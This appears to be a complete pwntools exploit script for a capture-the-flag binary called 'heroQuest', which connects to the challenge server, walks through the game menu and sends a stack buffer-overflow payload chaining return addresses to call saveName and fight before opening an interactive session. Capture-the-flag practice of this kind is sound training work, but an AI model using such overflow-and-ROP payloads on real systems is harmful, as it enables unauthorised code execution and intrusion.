from pwn import *

elf = ELF("./heroQuest_patched")

context.binary = elf

# p = process(stdout=PIPE)
p = remote("tjc.tf", 31365)

p.sendlineafter(b'! ', b'finalBoss\x00')

p.sendlineafter(b'est. ', b'w')

p.sendlineafter(b'back', b'r')

payload = b'a' * 32 + b'a' * 8 + pack(0x0000000000401016) + pack(0x00000000004017ab) + pack(elf.symbols['saveName']) + pack(elf.symbols['fight'])

p.sendlineafter(b'save file: ', payload)

p.interactive()
